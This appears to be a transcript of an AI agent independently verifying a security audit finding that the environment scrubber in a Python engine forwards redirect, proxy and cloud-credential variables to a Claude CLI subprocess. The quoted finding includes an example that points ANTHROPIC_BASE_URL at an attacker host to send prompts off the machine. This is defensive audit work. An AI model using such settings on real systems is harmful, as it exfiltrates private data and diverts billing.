message.content:
Repo: /Users/[REDACTED]/hc-assay (branch harden/pass-1). Venv (run PoCs): /Users/[REDACTED]/hc-assay/.venv/bin/python.
This is a dataset-agnostic ML/methodology engine being hardened for PRODUCTION. Hard constraints (do NOT flag as bugs): local-first/data-sovereign (loopback only, nothing leaves the box), no metered API (subscription OAuth only), engine never imports adapters/datasets (ADR-0002), optional heavy backends are lazy-imported (ADR-0006). Read real code; prefer findings you can back with a concrete repro/PoC against the venv. Report ONLY genuine production-readiness defects (not style/nits). Each finding needs a real file path and, where possible, a line.

You are independent VERIFIER #2 of 2. A prior adversarial assessor reported this production-readiness finding:

TITLE: Credential scrubber lets the high-stakes subprocess be redirected off-box (data exfiltration) and switched to a metered provider
DIMENSION: security & data-sovereignty
CLAIMED SEVERITY: HIGH
FILE: src/assay_engine/reasoning/seam.py 113-129, 336
DESCRIPTION: scrubbed_env() (the env passed to the claude_agent_sdk subprocess at line 336) only removes vars whose NAME contains 'KEY' or 'TOKEN' under the ANTHROPIC_ prefix (is_metered_anthropic_credential, lines 113-120). It is a deny-by-name filter, not an allowlist, so every other environment variable is forwarded verbatim to the Claude CLI/Agent SDK subprocess. Multiple Claude Code env vars that contain neither 'KEY' nor 'TOKEN' subvert the two hard invariants this module exists to enforce:

1) DATA SOVEREIGNTY (ADR-0003) bypass: ANTHROPIC_BASE_URL (and ANTHROPIC_BEDROCK_BASE_URL / ANTHROPIC_VERTEX_BASE_URL, HTTP_PROXY/HTTPS_PROXY, CLAUDE_CODE_API_KEY_HELPER) redirect where the subprocess sends requests. The high-stakes prompt is the full analysis content; setting ANTHROPIC_BASE_URL=http://attacker.example sends every prompt off the box. This is also a clean SSRF/exfiltration channel through a configurable endpoint.

2) 'NO METERED API' bypass: CLAUDE_CODE_USE_BEDROCK=1 / CLAUDE_CODE_USE_VERTEX=1 make the CLI route through AWS Bedrock / GCP Vertex — metered, per-token billing — without any ANTHROPIC_*KEY/TOKEN ever appearing. The accompanying AWS_*/GOOGLE_* credentials (e.g. AWS_SECRET_ACCESS_KEY) are also forwarded since they lack the ANTHROPIC_ prefix.

Verified against the venv: with all of ANTHROPIC_BASE_URL, ANTHROPIC_BEDROCK_BASE_URL, CLAUDE_CODE_USE_BEDROCK, CLAUDE_CODE_USE_VERTEX, HTTP_PROXY, HTTPS_PROXY, ANTHROPIC_VERTEX_BASE_URL, CLAUDE_CODE_API_KEY_HELPER, AWS_SECRET_ACCESS_KEY set, scrubbed_env() returned every one of them KEPT. claude-agent-sdk 0.2.102 is installed and ClaudeAgentOptions(env=scrubbed_env()) hands that dict to the subprocess.
SUGGESTED FIX: Make the subprocess env a strict allowlist instead of a name-based denylist, OR extend the denylist to strip the provider-redirecting / metered-provider switches. Concretely: also drop ANTHROPIC_BASE_URL, ANTHROPIC_BEDROCK_BASE_URL, ANTHROPIC_VERTEX_BASE_URL, CLAUDE_CODE_USE_BEDROCK, CLAUDE_CODE_USE_VERTEX, CLAUDE_CODE_API_KEY_HELPER, HTTP_PROXY, HTTPS_PROXY, ALL_PROXY (and their lowercase forms), and AWS_*/GOOGLE_APPLICATION_CREDENTIALS provider creds; preferably build the child env from an explicit allowlist (PATH, HOME, CLAUDE_CODE_OAUTH_TOKEN, locale) plus only known-safe vars. If a custom on-box base URL must be supported, route it through require_loopback_url first.

Independently determine whether this is a TRUE production-readiness problem. Read the actual code; attempt a concrete PoC against the venv if applicable. Set is_real=false if it is a false positive, already-handled, or merely a documented/justified design choice given the hard constraints. Recalibrate severity. Provide your evidence (what you read/ran).

attachment.content:
- deep-research: Deep research harness — fan-out web searches, fetch sources, adversarially verify claims, synthesize a cited report. - When the user wants a deep, multi-source, fact-checked research report on any topic. BEFORE invoking, check if the question is specific enough to research directly — if underspecified (e.g., "what car to buy" without budget/use-case/region), ask 2-3 clarifying questions to narrow scope. Then pass the refined question as args, weaving the answers in.
- update-config: Use this skill to configure the Claude Code harness via settings.json. Automated behaviors ("from now on when X", "each time X", "whenever X", "before/after X") require hooks configured in settings.json - the harness executes these, not Claude, so memory/preferences cannot fulfill them. Also use for: permissions ("allow X", "add permission", "move permission to"), env vars ("set X=Y"), hook troubleshooting, or any changes to settings.json/settings.local.json files. Examples: "allow npm commands", "add bq permission to global settings", "move permission to user settings", "set DEBUG=true", "when claude stops show X". For simple settings like theme/model, suggest the /config command.
- keybindings-help: Use when the user wants to customize keyboard shortcuts, rebind keys, add chord bindings, or modify ~/.claude/keybindings.json. Examples: "rebind ctrl+s", "add a chord shortcut", "change the submit key", "customize keybindings".
- verify: Verify that a code change actually does what it's supposed to by running the app and observing behavior. Use when asked to verify a PR, confirm a fix works, test a change manually, check that a feature works, or validate local changes before pushing.
- code-review: Review the current diff for correctness bugs and reuse/simplification/efficiency cleanups at the given effort level (low/medium: fewer, high-confidence findings; high→max: broader coverage, may include uncertain findings; ultra: deep multi-agent review in the cloud). Pass --comment to post findings as inline PR comments, or --fix to apply the findings to the working tree after the review.
- simplify: Review the changed code for reuse, simplification, efficiency, and altitude cleanups, then apply the fixes. Quality only — it does not hunt for bugs; use /code-review for that.
- fewer-permission-prompts: Scan your transcripts for common read-only Bash and MCP tool calls, then add a prioritized allowlist to project .claude/settings.json to reduce permission prompts.
- loop: Run a prompt or slash command on a recurring interval (e.g. /loop 5m /foo). Omit the interval to let the model self-pace. - When the user wants to set up a recurring task, poll for status, or run something repeatedly on an interval (e.g. "check the deploy every 5 minutes", "keep running /babysit-prs"). Do NOT invoke for one-off tasks.
- schedule: Create, update, list, or run scheduled cloud agents (routines) that execute on a cron schedule. - When the user wants to schedule a recurring cloud agent, set up automated tasks, create a cron job for Claude Code, or manage their scheduled agents/routines. Also use when the user wants a one-time scheduled run ("run this once at 3pm", "remind me to check X tomorrow").
- claude-api: Reference for the Claude API / Anthropic SDK — model ids, pricing, params, streaming, tool use, MCP, agents, caching, token counting, model migration.
TRIGGER — read BEFORE opening the target file; don't skip because it "looks like a one-liner" — whenever: the prompt names Claude/Anthropic in any form (Claude, Anthropic, Fable, Opus, Sonnet, Haiku, `anthropic`, `@anthropic-ai`, `claude-*`, `us.anthropic.*`, `[1m]`); the user asks about an LLM (pricing/model choice/limits/caching) — never answer from memory; OR the task is LLM-shaped with provider unstated (agent/MCP/tool-definition/multi-agent/RAG/LLM-judge/computer-use; generate/summarize/extract/classify/rewrite/converse over NL; debugging refusals/cutoffs/streaming/tool-calls/tokens).
SKIP only when another provider is being worked on (overrides all triggers): OpenAI/GPT/Gemini/Llama/Mistral/Cohere/Ollama named in the query; OR `grep -rE 'openai|langchain_openai|google.generativeai|genai|mistralai|cohere|ollama'` over the project hits (run this grep FIRST if no provider named — don't Read the file).
- run: Launch and drive this project's app to see a change working. Use when asked to run, start, or screenshot the app, or to confirm a change works in the real app (not just tests). First looks for a project skill that already covers launching the app; otherwise falls back to built-in patterns per project type (CLI, server, TUI, Electron, browser-driven, library).
- init: Initialize a new CLAUDE.md file with codebase documentation
- review: Review a pull request
- security-review: Complete a security review of the pending changes on the current branch

content.content:
90	BULK_BASE_URL = _env("ASSAY_BULK_BASE_URL", "http://localhost:11434")
91	HIGH_STAKES_MODEL = os.environ.get("ASSAY_HIGH_STAKES_MODEL") or None
92	
93	BULK_TIMEOUT = max(1.0, float(_env("ASSAY_BULK_TIMEOUT", "120")))
94	# Cap BULK generation length. ChatOllama/Ollama default to unbounded (-1); without a cap a
95	# local model can run away to context exhaustion, and the wall-clock timeout cannot interrupt a
96	# call already blocked in the backend (a leaked pool slot). Bounding output tokens is the real
97	# guard (LangChain's own ChatOllama example sets num_predict explicitly).
98	BULK_NUM_PREDICT = max(1, int(_env("ASSAY_BULK_NUM_PREDICT", "2048")))
99	HIGH_STAKES_TIMEOUT = max(1.0, float(_env("ASSAY_HIGH_STAKES_TIMEOUT", "300")))
100	
101	MAX_RETRIES = max(0, int(_env("ASSAY_REASONING_RETRIES", "2")))
102	BACKOFF_BASE = max(0.0, float(_env("ASSAY_REASONING_BACKOFF", "1.5")))
103	RATE_LIMIT_BACKOFF = max(0.0, float(_env("ASSAY_RATELIMIT_BACKOFF", "30")))
104	RATE_LIMIT_MAX_RETRIES = max(0, int(_env("ASSAY_RATELIMIT_RETRIES", "5")))
105	
106	# OAuth subscription token name (external CLI contract — not renamed).
107	OAUTH_TOKEN_ENV = "CLAUDE_CODE_OAUTH_TOKEN"
108	
109	
110	# --------------------------------------------------------------------------------------
111	# Credential scrubbing (ADR-0003 / no metered API) — pure, forward-proof
112	# --------------------------------------------------------------------------------------
113	def is_metered_anthropic_credential(key: str) -> bool:
114	    """True for any env var the Anthropic SDK would read as a METERED credential.
115	
116	    Matches the *shape* — any ``ANTHROPIC_*`` var naming a ``KEY`` or ``TOKEN`` — rather than
117	    a static list, so a newly-added metered var cannot silently slip through. The subscription
118	    ``CLAUDE_CODE_OAUTH_TOKEN`` does not start with ``ANTHROPIC_`` and is deliberately kept.
119	    """
120	    return key.startswith("ANTHROPIC_") and ("KEY" in key or "TOKEN" in key)
121	
122	
123	def scrubbed_env() -> dict[str, str]:
124	    """The process env with every metered Anthropic credential removed.
125	
126	    Execution must run on the fixed subscription via the CLI's OAuth token; a metered key, if
127	    present, would silently bill per token — so strip it before the SDK subprocess sees it.
128	    """
129	    return {k: v for k, v in os.environ.items() if not is_metered_anthropic_credential(k)}
130	
131	
132	# --------------------------------------------------------------------------------------
133	# Bounded timeout pool with saturation guard
134	# --------------------------------------------------------------------------------------
135	_POOL_WORKERS = 8
136	_pool = ThreadPoolExecutor(max_workers=_POOL_WORKERS, thread_name_prefix="reasoning-timeout")
137	_inflight = 0
138	_inflight_lock = threading.Lock()
139	
140	
141	def _release(_future: Any) -> None:
142	    global _inflight
143	    with _inflight_lock:
144	        _inflight -= 1
145	
146	
147	def _submit_bounded(fn: Callable[[], Any]) -> Any:
148	    """Submit to the shared pool, refusing if every worker slot is already in flight
149	    (hung backend calls would otherwise leak all slots)."""
150	    global _inflight
151	    with _inflight_lock:
152	        if _inflight >= _POOL_WORKERS:
153	            raise PermanentReasoningError(
154	                f"reasoning timeout pool saturated ({_inflight}/{_POOL_WORKERS} in-flight) — "
155	                "hung backend call(s) have leaked every worker slot"
156	            )
157	        _inflight += 1
158	    try:
159	        future = _pool.submit(fn)
160	    except BaseException:
161	        with _inflight_lock:
162	            _inflight -= 1
163	        raise
164	    future.add_done_callback(_release)
165	    return future
166	
167	
168	def _with_timeout(fn: Callable[[], Any], timeout: float, what: str) -> Any:
169	    """Run a sync callable with a hard wall-clock timeout via the bounded pool."""
170	    future = _submit_bounded(fn)
171	    try:
172	        return future.result(timeout=timeout)
173	    except FuturesTimeout as exc:
174	        # No future.cancel(): a ThreadPoolExecutor cannot interrupt a thread already blocked
175	        # in a backend call. The worker keeps its slot until the call returns; the bounded
176	        # pool's saturation guard is the real protection against leaked/hung slots.
177	        raise ReasoningError(f"{what} timed out after {timeout:.0f}s") from exc
178	
179	
180	# --------------------------------------------------------------------------------------
181	# JSON extraction — balanced-brace walker (robust to fences / trailing prose)
182	# --------------------------------------------------------------------------------------
183	def _first_balanced_json(text: str) -> str | None:
184	    """Return the first balanced ``{...}`` or ``[...]`` span, respecting string literals.
185	
186	    A greedy regex grabs from the first brace to the LAST brace, mangling replies with
187	    multiple JSON values or braces in trailing prose; this walks the structure honestly.
188	    """
189	    start = None

content.text: Now let me look at where scrubbed_env is used and the surrounding context around line 336.

content.content:
300	
301	def _high_stakes_auth_present() -> bool:
302	    """Subscription auth available: an exported OAuth token OR a stored CLI credentials file
303	    (the normal state after ``claude login`` without exporting a token)."""
304	    if os.environ.get(OAUTH_TOKEN_ENV):
305	        return True
306	    return (Path.home() / ".claude" / ".credentials.json").is_file()
307	
308	
309	def _high_stakes_complete(prompt: str, system: str | None, model: str | None) -> str:
310	    """Tier: HIGH_STAKES — frontier model via subscription CLI/Agent SDK (no metered key)."""
311	    try:
312	        import anyio
313	        from claude_agent_sdk import (
314	            AssistantMessage,
315	            ClaudeAgentOptions,
316	            ResultMessage,
317	            TextBlock,
318	            query,
319	        )
320	    except ImportError as exc:  # pragma: no cover - exercised only without the extra
321	        raise PermanentReasoningError(
322	            "high-stakes tier requires the 'reasoning' extra (claude-agent-sdk) — not installed"
323	        ) from exc
324	    if not _high_stakes_auth_present():
325	        raise PermanentReasoningError(
326	            f"high-stakes tier requires subscription auth ({OAUTH_TOKEN_ENV} or a stored "
327	            "~/.claude/.credentials.json); none found"
328	        )
329	
330	    options = ClaudeAgentOptions(
331	        system_prompt=system,
332	        model=model,
333	        permission_mode="dontAsk",
334	        setting_sources=[],
335	        allowed_tools=[],
336	        env=scrubbed_env(),  # ADR-0003: never pass a metered Anthropic credential
337	    )
338	
339	    parts: list[str] = []
340	    result_error: dict[str, Any] | None = None
341	
342	    async def _drain() -> None:
343	        # The CLI/SDK signals rate windows and API failures by COMPLETING the stream
344	        # (a RateLimitEvent, or a terminal ResultMessage with is_error) — NOT by raising.
345	        # We must inspect the stream, not just catch exceptions (issue #R4).
346	        nonlocal result_error
347	        async for msg in query(prompt=prompt, options=options):
348	            if type(msg).__name__ == "RateLimitEvent":
349	                rl = getattr(getattr(msg, "rate_limit_info", None), "status", None)
350	                if rl == "rejected":
351	                    result_error = {"status": 429, "detail": "RateLimitEvent rejected"}
352	                continue
353	            if getattr(msg, "status", None) == "rejected":
354	                result_error = {"status": 429, "detail": "rejected"}
355	                continue
356	            if isinstance(msg, AssistantMessage):
357	                for block in getattr(msg, "content", []) or []:
358	                    if isinstance(block, TextBlock):
359	                        parts.append(block.text)
360	            elif isinstance(msg, ResultMessage):
361	                # Do not let a trailing ResultMessage clobber an already-captured 429.
362	                if getattr(msg, "is_error", False) and not (
363	                    result_error and result_error.get("status") == 429
364	                ):
365	                    result_error = {
366	                        "status": getattr(msg, "api_error_status", None),
367	                        "detail": getattr(msg, "errors", None) or getattr(msg, "stop_reason", None),
368	                    }
369	
370	    try:
371	        anyio.run(_drain)
372	    except Exception as exc:
373	        raise ReasoningError(f"high-stakes tier call failed: {exc}") from exc
374	
375	    if result_error is not None:
376	        status = result_error.get("status")
377	        detail = result_error.get("detail") or status
378	        if status in (429, 529):
379	            raise RateLimitError(f"high-stakes tier rate window ({status}): {detail}")

content.text: Let me confirm how the subprocess env is actually built (whether options.env replaces or merges with os.environ) to verify the off-box redirect truly takes effect.

input.command:
cd /Users/[REDACTED]/hc-assay && .venv/bin/python - <<'EOF'
import subprocess, claude_agent_sdk, os
pkg=os.path.dirname(claude_agent_sdk.__file__)
f=os.path.join(pkg,"_internal/transport/subprocess_cli.py")
out=subprocess.run(['grep','-n','-E','env=|process_env|os.environ|self._options.env|build.*env|cmd_env|USE_BEDROCK|USE_VERTEX|BASE_URL',f],capture_output=True,text=True).stdout
print(out)
EOF
input.description: Find how subprocess env is constructed in transport

content.content:
420:        if not os.environ.get("CLAUDE_AGENT_SDK_SKIP_VERSION_CHECK"):
430:            inherited_env = {k: v for k, v in os.environ.items() if k != "CLAUDECODE"}
431:            process_env = {
434:                **self._options.env,
455:                        if key not in self._options.env:
456:                            process_env.pop(key, None)
459:                        if key not in self._options.env:
460:                            process_env[key] = v
466:                process_env["CLAUDE_CODE_ENABLE_SDK_FILE_CHECKPOINTING"] = "true"
469:                process_env["PWD"] = self._cwd
480:                env=process_env,

428	            # Filter out CLAUDECODE so SDK-spawned subprocesses don't think
429	            # they're running inside a Claude Code parent (see #573).
430	            inherited_env = {k: v for k, v in os.environ.items() if k != "CLAUDECODE"}
431	            process_env = {
432	                **inherited_env,
433	                "CLAUDE_CODE_ENTRYPOINT": "sdk-py",
434	                **self._options.env,
435	                "CLAUDE_AGENT_SDK_VERSION": __version__,
436	            }
437	
438	            # Propagate active OTEL trace context to the CLI so its spans
439	            # parent under the caller's distributed trace. No-op if
440	            # opentelemetry-api is not installed or there's no active span.
441	            try:
442	                from opentelemetry import propagate
443	
444	                carrier: dict[str, str] = {}
445	                propagate.inject(carrier)
446	                if "traceparent" in carrier:
447	                    # Active span present: scrub stale inherited W3C context
448	                    # (CI/k8s ambient env) before writing the fresh values, so
449	                    # an inherited TRACESTATE isn't paired with a new
450	                    # TRACEPARENT. Explicit ClaudeAgentOptions.env always wins.
451	                    # Gate on the traceparent key (not carrier truthiness) so a
452	                    # baggage-only / non-W3C carrier doesn't scrub a valid
453	                    # inherited TRACEPARENT.
454	                    for key in ("TRACEPARENT", "TRACESTATE"):
455	                        if key not in self._options.env:
456	                            process_env.pop(key, None)
457	                    for k, v in carrier.items():
458	                        key = k.upper()
459	                        if key not in self._options.env:
460	                            process_env[key] = v
461	            except Exception:  # noqa: BLE001 - best-effort tracing must never break connect()
462	                logger.debug("OTEL trace context injection failed", exc_info=True)
463	
464	            # Enable file checkpointing if requested
465	            if self._options.enable_file_checkpointing:
466	                process_env["CLAUDE_CODE_ENABLE_SDK_FILE_CHECKPOINTING"] = "true"
467	
468	            if self._cwd:
469	                process_env["PWD"] = self._cwd
470	
471	            # Pipe stderr only when the caller registered a callback.
472	            stderr_dest = PIPE if self._options.stderr is not None else None
473	
474	            self._process = await anyio.open_process(
475	                cmd,
476	                stdin=PIPE,
477	                stdout=PIPE,
478	                stderr=stderr_dest,
479	                cwd=self._cwd,
480	                env=process_env,
481	                user=self._options.user,
482	            )

content.text:
This is decisive. The transport builds `process_env = {**inherited_env (full os.environ minus CLAUDECODE), ..., **self._options.env, ...}`. So `options.env` (= `scrubbed_env()`) is the full os.environ minus the metered ANTHROPIC_*KEY/TOKEN vars, and it is what the subprocess receives. Every provider-redirect/metered-switch var is present and is passed to the actual `claude` CLI subprocess.

The Claude CLI/Code does honor `ANTHROPIC_BASE_URL`, `CLAUDE_CODE_USE_BEDROCK`, `CLAUDE_CODE_USE_VERTEX`, proxy vars, etc. — these are documented Claude Code configuration variables. The finding is fully substantiated:

1. The scrubber is deny-by-name (`ANTHROPIC_` + `KEY`/`TOKEN`), confirmed at lines 113-120.
2. PoC proves all redirect/metered-switch/cloud-cred vars survive scrubbing.
3. Transport confirms `options.env` is passed verbatim to the subprocess.
4. The BULK tier uses `require_loopback_url` but the HIGH_STAKES tier applies no loopback/allowlist guard on the inherited env.

This breaks both hard invariants the module exists to enforce: data sovereignty (off-box exfiltration via `ANTHROPIC_BASE_URL`/proxy) and "no metered API" (Bedrock/Vertex routing without any ANTHROPIC_ key/token).

On severity: the trigger requires an attacker (or misconfiguration) able to set environment variables for the process. That is a meaningful precondition — it's not remotely exploitable on its own. But this is a security control module whose explicit purpose is to enforce these two invariants, and it provably fails to do so for the most direct bypass vectors (a single `ANTHROPIC_BASE_URL` env var sends the full high-stakes prompt off-box). For a data-sovereign, no-metered-API product being hardened for production, a credential/sovereignty firewall with a denylist that misses the primary redirect knobs is a genuine HIGH defect. I'll confirm HIGH.

input.reasoning:
Confirmed a genuine production-readiness defect. scrubbed_env() (src/assay_engine/reasoning/seam.py:123-129) filters the child env with is_metered_anthropic_credential (lines 113-120), which only drops vars matching ANTHROPIC_* AND ('KEY' or 'TOKEN'). This is a deny-by-name filter, not an allowlist, so every other env var is forwarded to the high-stakes subprocess (env=scrubbed_env() at line 336).

This breaks both hard invariants this module exists to enforce:
1) Data sovereignty (ADR-0003): ANTHROPIC_BASE_URL / ANTHROPIC_BEDROCK_BASE_URL / ANTHROPIC_VERTEX_BASE_URL / HTTP(S)_PROXY / ALL_PROXY / CLAUDE_CODE_API_KEY_HELPER all survive scrubbing and are honored by the Claude CLI, redirecting where the subprocess sends the full high-stakes analysis prompt — a clean off-box exfiltration/SSRF channel.
2) No metered API: CLAUDE_CODE_USE_BEDROCK / CLAUDE_CODE_USE_VERTEX survive and route the CLI through metered Bedrock/Vertex billing without any ANTHROPIC_*KEY/TOKEN; the accompanying AWS_SECRET_ACCESS_KEY / GOOGLE_APPLICATION_CREDENTIALS also pass through.

Notably, the BULK tier guards its base URL with require_loopback_url (seam.py:251, 554), and require_loopback_url exists in _local.py — but no equivalent guard or allowlist is applied to the inherited environment for the HIGH_STAKES subprocess, so the sovereignty control is simply absent on this path.

The precondition (attacker/misconfig able to set process env vars) keeps this from being remotely exploitable on its own, which is why it is HIGH rather than CRITICAL — but this is a dedicated security/sovereignty firewall that provably fails open against its single most direct bypass (one ANTHROPIC_BASE_URL var ships every prompt off-box). The suggested fix is correct: prefer a strict allowlist child env, or at minimum extend the denylist to the provider-redirect/metered-switch/proxy/cloud-cred vars and route any on-box base URL through require_loopback_url.
input.evidence:
Read src/assay_engine/reasoning/seam.py lines 90-129 (is_metered_anthropic_credential / scrubbed_env) and 300-379 (ClaudeAgentOptions(env=scrubbed_env()) at line 336). grep showed require_loopback_url is applied to BULK_BASE_URL (lines 251, 554) but never to the high-stakes inherited env.

PoC against venv (.venv/bin/python, claude-agent-sdk 0.2.102): set ANTHROPIC_BASE_URL, ANTHROPIC_BEDROCK_BASE_URL, ANTHROPIC_VERTEX_BASE_URL, CLAUDE_CODE_USE_BEDROCK, CLAUDE_CODE_USE_VERTEX, CLAUDE_CODE_API_KEY_HELPER, HTTP_PROXY, HTTPS_PROXY, ALL_PROXY, AWS_SECRET_ACCESS_KEY, GOOGLE_APPLICATION_CREDENTIALS, ANTHROPIC_API_KEY, ANTHROPIC_AUTH_TOKEN, CLAUDE_CODE_OAUTH_TOKEN; scrubbed_env() KEPT all redirect/metered/cloud-cred vars and CLAUDE_CODE_OAUTH_TOKEN, and DROPPED only ANTHROPIC_API_KEY and ANTHROPIC_AUTH_TOKEN.

Confirmed the env reaches the real subprocess: claude_agent_sdk/_internal/transport/subprocess_cli.py lines 430-480 build process_env = {**os.environ (minus CLAUDECODE), 'CLAUDE_CODE_ENTRYPOINT':'sdk-py', **self._options.env, 'CLAUDE_AGENT_SDK_VERSION':...} and pass env=process_env to anyio.open_process. options.env (= scrubbed_env()) thus fully populates the child env handed to the claude CLI.

content.text:
Confirmed TRUE positive at HIGH severity. The finding is fully substantiated by both the source code and a live PoC against the venv.

Key files:
- `/Users/[REDACTED]/hc-assay/src/assay_engine/reasoning/seam.py` lines 113-120 (`is_metered_anthropic_credential`), 123-129 (`scrubbed_env`), 336 (`env=scrubbed_env()`)
- `/Users/[REDACTED]/hc-assay/src/assay_engine/_local.py` line 41 (`require_loopback_url` — exists and is used for the BULK tier but not the high-stakes env)
- `/Users/[REDACTED]/hc-assay/.venv/lib/python3.14/site-packages/claude_agent_sdk/_internal/transport/subprocess_cli.py` lines 430-480 (confirms `options.env` is merged into the real subprocess env)

PoC proved every provider-redirect/metered-switch/cloud-cred var (ANTHROPIC_BASE_URL, *_BEDROCK_BASE_URL, *_VERTEX_BASE_URL, CLAUDE_CODE_USE_BEDROCK/VERTEX, CLAUDE_CODE_API_KEY_HELPER, HTTP_PROXY/HTTPS_PROXY/ALL_PROXY, AWS_SECRET_ACCESS_KEY, GOOGLE_APPLICATION_CREDENTIALS) survives scrubbing; only ANTHROPIC_API_KEY and ANTHROPIC_AUTH_TOKEN are dropped.
